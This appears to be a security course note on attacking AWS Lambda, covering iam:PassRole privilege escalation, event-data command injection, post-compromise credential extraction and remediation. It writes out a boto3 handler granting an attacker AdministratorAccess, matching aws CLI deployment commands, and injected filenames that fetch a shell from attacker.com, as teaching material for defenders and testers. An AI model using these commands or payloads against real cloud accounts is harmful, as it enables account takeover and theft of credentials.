---
tags: [aws, lambda, serverless, privesc, event-injection]
difficulty: intermediate
module: "37 - Cloud Infrastructure"
topic: "37.04 AWS Lambda"
---

# AWS Lambda — Privilege Escalation and Event Injection

## 1. Introduction to AWS Lambda Security
AWS Lambda is a serverless computing service that lets you run code without provisioning or managing servers. In a serverless architecture, the traditional attack surface (OS, open ports, network firewalls) is abstracted away. However, new attack vectors emerge, primarily revolving around IAM Privilege Escalation, Event Data Injection, and insecure dependencies.

Every Lambda function is associated with an **Execution Role** (an IAM role that grants the function permission to interact with other AWS services). The security of a Lambda function heavily depends on the privileges granted to this execution role.

## 2. ASCII Architecture Diagram: Lambda Event Injection

```text
    [ User Input / Trigger Source ]
    (e.g., API Gateway, S3 Event, SQS)
             |
             |  1. Malicious payload passed in event data
             |     {"filename": "test.txt; wget attacker.com/shell | sh"}
             v
    [ AWS API Gateway ]
             |
             |  2. Event object passed to Lambda function handler
             v
   +-------------------------------------------------+
   |              AWS Lambda Container               |
   |                                                 |
   |  def handler(event, context):                   |
   |      # 3. Insecure use of event data            |
   |      os.system("cat " + event['filename'])      |
   |                                                 |
   |      # 4. Command Injection Executes!           |
   |                                                 |
   +-------------------------------------------------+
             |
             |  5. Malicious code queries Lambda environment
             |     variables for AWS_ACCESS_KEY_ID
             v
    [ Attacker exfiltrates STS Credentials ]
             |
             |  6. Attacker uses credentials locally
             v
    [ IAM Privilege Escalation / Lateral Movement ]
```

## 3. Lambda Privilege Escalation (`iam:PassRole` + `lambda:CreateFunction`)
One of the most critical cloud misconfigurations is granting an identity the ability to create or update Lambda functions while also granting `iam:PassRole`.

### The Attack Vector
If an attacker compromises an IAM user with `lambda:CreateFunction` (or `lambda:UpdateFunctionCode`) and `iam:PassRole`, they can escalate privileges to any role that they are allowed to pass.

### Exploitation Steps
1. **Identify Target Role**: The attacker finds a highly privileged role, such as `arn:aws:iam::123456789012:role/AdminRole`.
2. **Write Malicious Code**: The attacker writes a simple Lambda function in Python that uses boto3 to attach an admin policy to the attacker's own IAM user, or simply exfiltrates the STS credentials.
   ```python
   import boto3, os
   def lambda_handler(event, context):
       client = boto3.client('iam')
       response = client.attach_user_policy(
           UserName='attacker_user',
           PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
       )
       return response
   ```
3. **Zip the Code**: `zip payload.zip lambda_function.py`
4. **Deploy and Pass Role**: The attacker creates the function, assigning it the target `AdminRole`.
   ```bash
   aws lambda create-function \
       --function-name PrivilegeEscalation \
       --runtime python3.9 \
       --role arn:aws:iam::123456789012:role/AdminRole \
       --handler lambda_function.lambda_handler \
       --zip-file fileb://payload.zip
   ```
5. **Invoke the Function**:
   ```bash
   aws lambda invoke --function-name PrivilegeEscalation output.txt
   ```
6. **Result**: The function executes with the privileges of `AdminRole` and grants the attacker's user Administrator access.

## 4. Event Data Injection
In traditional web apps, input comes from HTTP requests. In Lambda, input comes from the `event` object. This event can originate from dozens of sources: S3 bucket uploads, DynamoDB streams, SQS messages, or API Gateway.

### Vulnerability
If the Lambda function parses the `event` object and passes unsanitized data to risky sinks (e.g., `os.system()`, `eval()`, SQL queries), it results in injection vulnerabilities.

### Exploitation via S3 Trigger
1. A Lambda function is triggered when an object is uploaded to S3. It reads the object key (filename) to process it.
2. The developer writes: `os.system(f"ImageMagick convert {event['Records'][0]['s3']['object']['key']} out.png")`
3. The attacker uploads a file named `image.jpg; curl http://attacker.com/revshell | bash`.
4. The Lambda executes the OS command, resulting in a reverse shell from the Lambda container.

## 5. Post-Compromise inside a Lambda Environment
Once an attacker achieves Remote Code Execution (RCE) inside a Lambda container, what can they do?

### 5.1. Extracting Credentials
Lambda environments have built-in environment variables containing the STS credentials for the execution role.
```bash
env | grep AWS_
```
This yields `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, and `AWS_SESSION_TOKEN`. The attacker can exfiltrate these to their local machine and assume the role of the Lambda function.

### 5.2. Persistence and Lateral Movement
The Lambda execution environment is ephemeral (it freezes and eventually dies), but containers can be reused for subsequent invocations (Warm Start). An attacker can modify the runtime, hook functions, or install backdoors in the `/tmp` directory (which persists across warm starts and allows up to 10GB of storage) to intercept future event payloads, stealing sensitive data processed by the Lambda.

## 6. Resource Policies (Lambda Permissions)
Just like S3 buckets, Lambda functions have Resource-Based Policies. A misconfigured resource policy might allow external AWS accounts or unauthenticated users to invoke the function.
- **Enumeration**: `aws lambda get-policy --function-name MyFunction`
- **Impact**: Unauthenticated invocation can lead to Application DoS, financial exhaustion (Denial of Wallet), or exploitation of logic flaws within the function.

## 7. Remediation and Best Practices
1. **Strict IAM Boundaries**: Never grant `iam:PassRole` with `*` or wide role scopes alongside `lambda:CreateFunction` or `lambda:UpdateFunctionCode`. Use resource boundaries.
2. **Least Privilege Execution Roles**: Lambda execution roles should only have access to the exact resources they need (e.g., read access to a specific S3 bucket, not `s3:*`).
3. **Input Validation**: Treat the `event` object as untrusted user input, regardless of the trigger source. Implement strict type checking and sanitization.
4. **VPC Configuration**: If a Lambda doesn't need internet access, place it in a VPC without a NAT gateway to prevent easy data exfiltration.
5. **Code Scanning**: Regularly scan Lambda deployment packages for vulnerable dependencies (Software Composition Analysis).

## 8. Conclusion
AWS Lambda shifts the security focus from infrastructure management to application code and IAM configurations. Securing serverless environments requires a deep understanding of event-driven architectures and the strict enforcement of least privilege on execution roles.

---

## Chaining Opportunities
- **[[01 - AWS IAM — Roles, Policies, Misconfigurations]]**: Exploiting Lambda creation is a primary vehicle for executing an IAM Privilege Escalation attack via `iam:PassRole`.
- **[[06 - AWS SecretsManager Parameter Store — Misconfigured Access]]**: Once RCE is achieved in a Lambda, the attacker can extract the execution role's credentials and query Secrets Manager for database passwords the Lambda might use.
- **[[02 - AWS S3 — Public Access, ACL Misconfiguration]]**: An attacker can trigger malicious payloads by uploading files to weakly configured S3 buckets that act as event triggers for Lambda.

## Related Notes
- [[03 - AWS EC2 — Metadata Service (IMDS) Exploitation]]
- [[07 - AWS CloudTrail — Disabling Logging]]
